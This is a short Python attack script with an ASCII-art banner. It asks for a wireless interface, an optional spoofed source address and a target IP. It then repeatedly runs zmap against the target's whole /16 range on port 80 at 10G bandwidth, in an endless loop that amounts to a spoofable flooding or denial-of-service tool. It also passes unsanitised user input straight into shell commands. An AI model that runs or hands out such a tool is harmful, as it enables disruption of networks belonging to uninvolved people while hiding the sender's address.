import os
import time


ip = "0.0.0.0"
spoof = ""
extension = ""

os.system("clear")

print(" ______________      _            ____________           ______      _        __")
print("| |____________|    | |          |  __________|         /  ____|    | |      / /")
print("| |                 | |          | |                   /  /         | |     / / ")
print("| |                 | |          | |                  /  /          | |    / /  ")
print("| |                 | |          | |__________       /  /           | |   / /   ")
print("| |____________     | |          |  __________|     /  /            | |  / /    ")
print("|  ____________|    | |          | |               |  |             | | / /     ")
print("| |                 | |          | |                \  \            | |/ /      ")
print("| |                 | |          | |                 \  \           |    \      ")
print("| |                 | |          | |                  \  \          |  /\ \     ")
print("| |                 | |_____     | |__________         \  \__ _     | |  \ \    ")
print("|_|                 |_______|    |____________|         \_____|     |_|   \_\   ")
print("                                                                                ")
print("                                                                                ")

extension = input("wireless extension (wlan0/wlan1...: ")
print(" ")

spoof = input("Type spoofed address (leave blank for deafult): ")
print(" ")

ip = input("Target ip: ")

if spoof == "":
 while 1:
  os.system("zmap -i "+ extension +" -B 10G -p 80 -T 10 -P 10 "+ ip +"/16")
  time.sleep(5)

else:
 while 1:
  os.system("zmap -i "+ extension +" -S "+ spoof +" -B 10G -p 80 -T 10 -P 10 "+ ip +"/16")
  time.sleep(5)



